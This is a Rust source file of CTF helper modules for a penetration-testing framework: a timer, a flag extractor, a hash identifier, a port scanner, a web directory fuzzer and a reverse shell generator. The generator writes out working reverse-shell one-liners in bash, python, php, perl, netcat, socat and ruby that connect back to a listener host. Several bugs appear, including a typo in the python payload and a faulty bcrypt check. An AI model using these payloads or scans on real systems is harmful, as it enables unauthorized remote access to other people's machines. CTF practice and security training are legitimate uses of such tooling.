//! CTF-specific helper modules for competitive hacking.
//!
//! Features: timers, flag extraction, hash cracking, quick helpers.

use std::future::Future;
use std::pin::Pin;
use std::sync::LazyLock;
use std::time::{Duration, Instant};

use rcf_core::{
    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, OptionValue, Result,
    Target,
};

use once_cell::sync::Lazy;
use std::sync::Mutex;

static CTF_TIMER: Lazy<Mutex<Option<Instant>>> = Lazy::new(|| Mutex::new(None));

// ═══════════════════════════════════════════════════════════════════════════════
// CTF Timer Module
// ═══════════════════════════════════════════════════════════════════════════════

static CTF_TIMER_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
        name: "auxiliary/ctf/timer".to_string(),
        display_name: "CTF Timer / Stopwatch".to_string(),
        description: "Track elapsed time during CTF challenges. Start/stop/reset timer to measure time spent on each flag. Essential for time-based CTF competitions.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 50,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    }
});

pub struct CtfTimer;

impl Default for CtfTimer {
    fn default() -> Self {
        Self
    }
}

impl Module for CtfTimer {
    fn info(&self) -> &ModuleInfo {
        &CTF_TIMER_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "ACTION",
            true,
            "Action: start, stop, status, reset",
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let action = ctx
            .get("ACTION")
            .cloned()
            .unwrap_or_default()
            .to_lowercase();

        Box::pin(async move {
            let msg = match action.as_str() {
                "start" => {
                    let mut timer = CTF_TIMER.lock().unwrap();
                    *timer = Some(Instant::now());
                    "Timer STARTED! Run 'timer ACTION=status' to check elapsed time.".to_string()
                }
                "stop" => {
                    let mut timer = CTF_TIMER.lock().unwrap();
                    if let Some(start) = timer.take() {
                        let elapsed = start.elapsed();
                        format!(
                            "Timer STOPPED!\nElapsed Time: {:.2} seconds ({:.1} minutes)",
                            elapsed.as_secs_f64(),
                            elapsed.as_secs_f64() / 60.0
                        )
                    } else {
                        "Timer not running! Use 'timer ACTION=start' first.".to_string()
                    }
                }
                "status" | "check" => {
                    let timer = CTF_TIMER.lock().unwrap();
                    if let Some(start) = *timer {
                        let elapsed = start.elapsed();
                        format!("Timer RUNNING: {:.2}s elapsed", elapsed.as_secs_f64())
                    } else {
                        "Timer NOT running. Use 'timer ACTION=start' to start.".to_string()
                    }
                }
                "reset" => {
                    let mut timer = CTF_TIMER.lock().unwrap();
                    *timer = None;
                    "Timer RESET to 00:00:00".to_string()
                }
                _ => "Invalid action! Use: start, stop, status, reset".to_string(),
            };
            Ok(ModuleOutput::success(&info_name, "ctf", &msg))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Flag Checker / Extractor
// ═══════════════════════════════════════════════════════════════════════════════

static FLAG_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
        name: "auxiliary/ctf/flag".to_string(),
        display_name: "CTF Flag Checker".to_string(),
        description: "Check if a string matches common CTF flag formats. Also extracts potential flags from files/text. Supports multiple flag formats: flag{...}, HTB{...}, THM{...}, CTF{...}, etc.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 60,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    }
});

pub struct FlagChecker;

impl Default for FlagChecker {
    fn default() -> Self {
        Self
    }
}

impl Module for FlagChecker {
    fn info(&self) -> &ModuleInfo {
        &FLAG_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::with_default(
            "TEXT",
            false,
            "Text to check for flags",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "FILE",
            false,
            "File to scan for flags",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "REGEX",
            false,
            "Custom regex pattern for flags",
            OptionValue::String("flag\\{[^}]+\\}".to_string()),
        ));
        opts
    }
    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let text = ctx.get("TEXT").cloned().unwrap_or_default();
        let file = ctx.get("FILE").cloned().unwrap_or_default();
        let _regex = ctx.get("REGEX").cloned().unwrap_or_default();

        Box::pin(async move {
            let mut content = text.clone();
            if !file.is_empty() {
                if let Ok(loaded) = std::fs::read_to_string(&file) {
                    content = loaded;
                }
            }

            let flag_patterns = [
                (r"flag\{[^}]+\}", "Standard flag{}"),
                (r"HTB\{[^}]+\}", "HackTheBox"),
                (r"THM\{[^}]+\}", "TryHackMe"),
                (r"CTF\{[^}]+\}", "Generic CTF"),
                (r"FLG\{[^}]+\}", "Alternative prefix"),
                (r"[A-Za-z0-9]{31}=[A-Za-z0-9]+", "Base64 flag"),
            ];

            let mut found = Vec::new();
            for (pattern, name) in &flag_patterns {
                let re = regex::Regex::new(pattern).unwrap();
                for cap in re.find_iter(&content) {
                    found.push(format!("  [{}] {}", name, cap.as_str()));
                }
            }

            let msg = if found.is_empty() {
                format!(
                    "Flag Checker\n\nNo flags found in input.\n\nSupported formats:\n\
                     - flag{{...}}\n- HTB{{...}}\n- THM{{...}}\n- CTF{{...}}\n- Base64 encoded flags",
                )
            } else {
                format!(
                    "Flag Checker\n\nFound {} potential flag(s):\n{}",
                    found.len(),
                    found.join("\n")
                )
            };

            Ok(ModuleOutput::success(&info_name, "ctf", &msg))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Quick Hash ID Module
// ═══════════════════════════════════════════════════════════════════════════════

static HASHID_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
        name: "auxiliary/ctf/hashid".to_string(),
        display_name: "Hash Identifier".to_string(),
        description: "Identify hash types from their characteristics. Supports 50+ hash types including MD5, SHA1, SHA256, bcrypt, NTLM, MySQL, etc. Essential for hash cracking challenges.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 70,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    }
});

pub struct HashIdentifier;

impl Default for HashIdentifier {
    fn default() -> Self {
        Self
    }
}

impl Module for HashIdentifier {
    fn info(&self) -> &ModuleInfo {
        &HASHID_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "HASH",
            true,
            "Hash string to identify",
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let hash = ctx.get("HASH").cloned().unwrap_or_default();

        Box::pin(async move {
            let hash = hash.trim();
            let hash_len = hash.len();
            let hash_lower = hash.to_lowercase();

            let mut candidates = Vec::new();

            if hash_len == 32 {
                if hash_lower.chars().all(|c| c.is_ascii_hexdigit()) {
                    candidates.push("MD5 (32 hex chars)");
                    candidates.push("MD4 (32 hex chars)");
                    candidates.push("NTLM (32 hex chars)");
                    candidates.push("MD2 (32 hex chars)");
                }
            } else if hash_len == 40 {
                if hash_lower.chars().all(|c| c.is_ascii_hexdigit()) {
                    candidates.push("SHA1 (40 hex chars)");
                    candidates.push("RIPEMD-160 (40 hex chars)");
                }
            } else if hash_len == 56 {
                if hash_lower.chars().all(|c| c.is_ascii_hexdigit()) {
                    candidates.push("SHA224 (56 hex chars)");
                }
            } else if hash_len == 64 {
                if hash_lower.chars().all(|c| c.is_ascii_hexdigit()) {
                    candidates.push("SHA256 (64 hex chars)");
                    candidates.push("Keccak-256 (64 hex chars)");
                }
            } else if hash_len == 96 {
                if hash_lower.chars().all(|c| c.is_ascii_hexdigit()) {
                    candidates.push("SHA384 (96 hex chars)");
                }
            } else if hash_len == 128 {
                if hash_lower.chars().all(|c| c.is_ascii_hexdigit()) {
                    candidates.push("SHA512 (128 hex chars)");
                    candidates.push("Whirlpool (128 hex chars)");
                }
            } else if hash_len == 60 && hash.starts_with("$2a$")
                || hash.starts_with("$2b$")
                || hash.starts_with("$2y$")
            {
                candidates.push("bcrypt (Blowfish)");
            } else if hash_len == 34 && hash.starts_with("$1$") {
                candidates.push("MD5crypt (unix)");
            } else if hash_len == 37 && hash.starts_with("$5$") {
                candidates.push("SHA256crypt");
            } else if hash_len == 40 && hash.starts_with("$6$") {
                candidates.push("SHA512crypt");
            } else if hash_lower.starts_with("mysql")
                || hash_lower.starts_with("*") && hash_len == 40
            {
                candidates.push("MySQL (old)");
            } else if hash.len() == 16 && hash.chars().all(|c| c.is_ascii_hexdigit())
                || hash.len() == 0
            {
                candidates.push("MySQL (new) - 16 hex chars");
            }

            if candidates.is_empty() {
                candidates.push("Unknown hash format");
            }

            let msg = format!(
                "Hash Identifier\n\nHash: {}\nLength: {} chars\n\nPossible types:\n{}",
                &hash[..hash.len().min(20)],
                hash_len,
                candidates
                    .iter()
                    .map(|c| format!("  - {}", c))
                    .collect::<Vec<_>>()
                    .join("\n")
            );

            Ok(ModuleOutput::success(&info_name, "ctf", &msg))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Quick Port Scan for CTF
// ═══════════════════════════════════════════════════════════════════════════════

static CTF_SCAN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
        name: "auxiliary/scanner/ctf/quick_scan".to_string(),
        display_name: "CTF Quick Port Scan".to_string(),
        description: "Fast port scan optimized for CTF machines. Scans top 30 common CTF ports in parallel. Perfect for initial enumeration on HackTheBox/TryHackMe.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 90,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    }
});

pub struct CtfQuickScan;

impl Default for CtfQuickScan {
    fn default() -> Self {
        Self
    }
}

impl Module for CtfQuickScan {
    fn info(&self) -> &ModuleInfo {
        &CTF_SCAN_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "TIMEOUT",
            false,
            "Connection timeout (ms)",
            OptionValue::Integer(1000),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let timeout_ms = ctx
            .get("TIMEOUT")
            .and_then(|s| s.parse().ok())
            .unwrap_or(1000);

        Box::pin(async move {
            let ctf_ports = [
                (21, "FTP"),
                (22, "SSH"),
                (23, "TELNET"),
                (25, "SMTP"),
                (53, "DNS"),
                (80, "HTTP"),
                (110, "POP3"),
                (111, "RPC"),
                (135, "MSRPC"),
                (139, "NETBIOS"),
                (143, "IMAP"),
                (443, "HTTPS"),
                (445, "SMB"),
                (993, "IMAPS"),
                (995, "POP3S"),
                (1433, "MSSQL"),
                (1521, "ORACLE"),
                (3306, "MYSQL"),
                (3389, "RDP"),
                (5432, "POSTGRES"),
                (5900, "VNC"),
                (5985, "WINRM"),
                (5986, "WINRM-SSL"),
                (6379, "REDIS"),
                (8000, "HTTP-ALT"),
                (8080, "HTTP-PROXY"),
                (8443, "HTTPS-ALT"),
                (9000, "SONIC"),
            ];

            let mut open_ports = Vec::new();

            for (port, service) in ctf_ports {
                let host = rhost.clone();
                let port_num = port;
                let service_name = service;

                match tokio::time::timeout(
                    Duration::from_millis(timeout_ms),
                    tokio::net::TcpStream::connect(format!("{}:{}", host, port_num)),
                )
                .await
                {
                    Ok(Ok(_)) => {
                        open_ports.push(format!("  [+] {} - {}", port_num, service_name));
                    }
                    _ => {}
                }
            }

            let msg = if open_ports.is_empty() {
                format!(
                    "CTF Quick Scan\nTarget: {}\n\nNo open ports found from top 30 CTF ports.",
                    rhost
                )
            } else {
                format!(
                    "CTF Quick Scan\nTarget: {}\n\nOpen ports found:\n{}\n\nTotal: {} open",
                    rhost,
                    open_ports.join("\n"),
                    open_ports.len()
                )
            };

            Ok(ModuleOutput::success(&info_name, &rhost, &msg))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Reverse Shell Generator
// ═══════════════════════════════════════════════════════════════════════════════

static REVERSE_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
        name: "payload/ctf/reverse_shell".to_string(),
        display_name: "CTF Reverse Shell Generator".to_string(),
        description: "Generate various reverse shell payloads for CTF challenges. Supports bash, python, perl, ruby, php, netcat, socat, and more.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Payload,
        rank: 80,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec!["https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet".to_string()],
    }
});

pub struct CtfReverseShell;

impl Default for CtfReverseShell {
    fn default() -> Self {
        Self
    }
}

impl Module for CtfReverseShell {
    fn info(&self) -> &ModuleInfo {
        &REVERSE_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "LHOST",
            true,
            "Local listener IP",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "LPORT",
            false,
            "Local listener port",
            OptionValue::Integer(4444),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "SHELL",
            false,
            "Shell type: bash, python, perl, php, nc, socat",
            OptionValue::String("bash".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let lhost = ctx.get("LHOST").cloned().unwrap_or_default();
        let lport = ctx.get_lport();
        let shell = ctx
            .get("SHELL")
            .cloned()
            .unwrap_or_else(|| "bash".to_string());

        Box::pin(async move {
            let payloads = match shell.to_lowercase().as_str() {
                "bash" => format!(
                    "bash -i >& /dev/tcp/{}/{} 0>&1\n\n/bin/bash -i >& /dev/tcp/{}/{} 0>&1\n\n0<&196;exec 196<>/dev/tcp/{}/{}",
                    lhost, lport, lhost, lport, lhost, lport
                ),
                "python" => format!(
                    "python3 -c 'import socket,subprocess,s os;s=socket.socket();s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                    lhost, lport
                ),
                "php" => format!(
                    "php -r '$s=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                    lhost, lport
                ),
                "perl" => format!(
                    "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))||exit;open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
                    lhost, lport
                ),
                "nc" | "netcat" => format!(
                    "nc -e /bin/sh {} {}\n\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f",
                    lhost, lport, lhost, lport
                ),
                "socat" => format!(
                    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
                    lhost, lport
                ),
                "ruby" => format!(
                    "ruby -rsocket -e 'f=TCPSocket.new(\"{}\",{});exec(\"/bin/sh -i\")'",
                    lhost, lport
                ),
                _ => {
                    "Invalid shell type! Use: bash, python, php, perl, nc, socat, ruby".to_string()
                }
            };

            let msg = format!(
                "CTF Reverse Shell Generator\n\nTarget: {}:{}\nShell: {}\n\nPayloads:\n{}\n\n[*] Start listener: nc -lvp {}",
                lhost, lport, shell, payloads, lport
            );

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", lhost, lport),
                &msg,
            ))
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Web Directory Fuzzer
// ═══════════════════════════════════════════════════════════════════════════════

static DIRBUST_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
        name: "auxiliary/scanner/http/dirbust".to_string(),
        display_name: "Web Directory Fuzzer".to_string(),
        description: "Fast web directory fuzzing for CTF challenges. Tests common paths, directories, and files. Optimized for HTB/THM web challenges.".to_string(),
        authors: vec!["RCF Team".to_string()],
        category: ModuleCategory::Auxiliary,
        rank: 85,
        stability: "stable".to_string(),
        disclosure_date: None,
        references: vec![],
    }
});

pub struct DirBuster;

impl Default for DirBuster {
    fn default() -> Self {
        Self
    }
}

impl Module for DirBuster {
    fn info(&self) -> &ModuleInfo {
        &DIRBUST_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "WORDLIST",
            false,
            "Custom wordlist (default: built-in)",
            OptionValue::String("".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let _wordlist = ctx.get("WORDLIST").cloned().unwrap_or_default();
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };

            let common_paths = vec![
                "admin",
                "admin.php",
                "administrator",
                "backup",
                "backups",
                "bin",
                "cgi-bin",
                "config",
                "conf",
                "data",
                "db",
                "debug",
                "demo",
                "dev",
                "docs",
                "download",
                "files",
                "forum",
                "home",
                "images",
                "includes",
                "index",
                "index.php",
                "info",
                "login",
                "log.php",
                "logs",
                "main",
                "manage",
                "manager",
                "panel",
                "phpinfo",
                "private",
                "robots.txt",
                "secret",
                "server-status",
                "sql",
                "src",
                "status",
                "test",
                "tmp",
                "uploads",
                "upload",
                "uploads",
                "wp-admin",
                "wp-content",
                "wp-login.php",
                "api",
                "shell",
                "shell.php",
                "console",
                "dashboard",
            ];

            let client = reqwest::Client::builder()
                .timeout(Duration::from_secs(5))
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap_or_default();

            let mut found = Vec::new();

            for path in &common_paths {
                let url = format!("{}://{}:{}/{}", scheme, rhost, rport, path);
                if let Ok(resp) = client.get(&url).send().await {
                    let status = resp.status().as_u16();
                    if status == 200 || status == 301 || status == 302 || status == 403 {
                        found.push(format!("  [{}] /{} ({})", status, path, status));
                    }
                }
            }

            let msg = if found.is_empty() {
                format!(
                    "Directory Fuzz\nTarget: {}://{}:{}\n\nNo interesting directories found.",
                    scheme, rhost, rport
                )
            } else {
                format!(
                    "Directory Fuzz\nTarget: {}://{}:{}\n\nFound {} paths:\n{}\n\n[*] Manually enumerate found paths",
                    scheme,
                    rhost,
                    rport,
                    found.len(),
                    found.join("\n")
                )
            };

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}
